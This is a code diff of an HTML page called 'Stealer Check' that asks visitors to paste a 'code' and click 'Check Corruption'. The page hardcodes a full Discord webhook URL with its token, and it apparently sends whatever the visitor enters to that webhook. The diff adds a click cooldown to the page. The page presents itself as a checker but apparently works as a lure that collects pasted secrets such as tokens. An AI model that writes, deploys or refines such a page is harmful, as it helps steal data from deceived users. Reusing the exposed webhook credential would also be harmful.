@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Stealer Info Check</title>
-    <!-- Tailwind CSS CDN for easy styling -->
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         /* Custom styles for the Inter font and overall body */
@@ -26,7 +25,6 @@
     <div class="bg-gray-800 p-8 rounded-lg shadow-xl w-full max-w-md mx-auto border border-gray-700">
         <h1 class="text-3xl font-bold text-white mb-6 text-center">Stealer Check</h1>
 
-        <!-- Text area for the message -->
         <div class="mb-4">
             <label for="messageInput" class="block text-gray-300 text-sm font-semibold mb-2">Enter Code:</label>
             <textarea
@@ -37,7 +35,6 @@
             ></textarea>
         </div>
 
-        <!-- Button to send the message -->
         <button
             id="sendButton"
             class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-4 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-opacity-75 transition duration-300 ease-in-out transform hover:scale-105"
@@ -45,10 +42,8 @@
             Check Corruption
         </button>
 
-        <!-- Message box for feedback -->
         <div id="messageBox" class="mt-6 p-3 text-sm text-center rounded-md hidden">
-            <!-- Messages will be displayed here -->
-        </div>
+            </div>
     </div>
 
     <script>
@@ -59,6 +54,10 @@
 
         // Discord webhook URL
         const webhookUrl = 'https://discord.com/api/webhooks/1395524525038501898/NvLWqzSozM0UVmcBWOjPLnFyk8_u0HOv-APeS5kjr6ZwT0kapfpkYuH4b8W7uKBSO7qF';
+
+        // Cooldown variables
+        const cooldownTime = 20 * 1000; // 20 seconds in milliseconds
+        let lastClickTime = 0;
 
         /**
          * Displays a message in the message box.
@@ -81,6 +80,15 @@
 
         // Add event listener to the send button
         sendButton.addEventListener('click', async () => {
+            const currentTime = Date.now();
+            const timeSinceLastClick = currentTime - lastClickTime;
+
+            if (timeSinceLastClick < cooldownTime) {
+                const timeLeft = Math.ceil((cooldownTime - timeSinceLastClick) / 1000);
+                showMessageBox(`Please wait ${timeLeft} seconds before checking again.`, true);
+                return; // Prevent execution if still on cooldown
+            }
+
             const message = messageInput.value.trim(); // Get the text and remove leading/trailing whitespace
 
             // Check if the message is empty
@@ -88,6 +96,9 @@
                 showMessageBox('Please enter a message before Checking.', true);
                 return; // Stop execution if message is empty
             }
+
+            // Set the last click time
+            lastClickTime = currentTime;
 
             // Disable the button and show a loading indicator
             sendButton.disabled = true;
@@ -117,11 +128,27 @@
                 showMessageBox(`An error occurred: ${error.message}`, true);
                 console.error('Fetch error:', error);
             } finally {
-                // Re-enable the button regardless of success or failure
+                // Re-enable the button regardless of success or failure (after cooldown)
+                // The button will be re-enabled automatically after the cooldown expires
+                // if the user tries to click it again, or they can wait for the next allowed click.
+                // We'll keep it disabled until the cooldown is over or next attempt.
+                // For now, we only enable it if it was disabled due to an error,
+                // otherwise, it remains disabled until the cooldown naturally passes.
+                if (Date.now() - lastClickTime >= cooldownTime) {
+                     sendButton.disabled = false;
+                     sendButton.textContent = 'Check Corruption';
+                }
+            }
+        });
+
+        // This interval will re-enable the button once the cooldown is over,
+        // even if the user doesn't try to click it again.
+        setInterval(() => {
+            if (sendButton.disabled && Date.now() - lastClickTime >= cooldownTime) {
                 sendButton.disabled = false;
                 sendButton.textContent = 'Check Corruption';
             }
-        });
+        }, 1000); // Check every second
     </script>
 </body>
 </html>
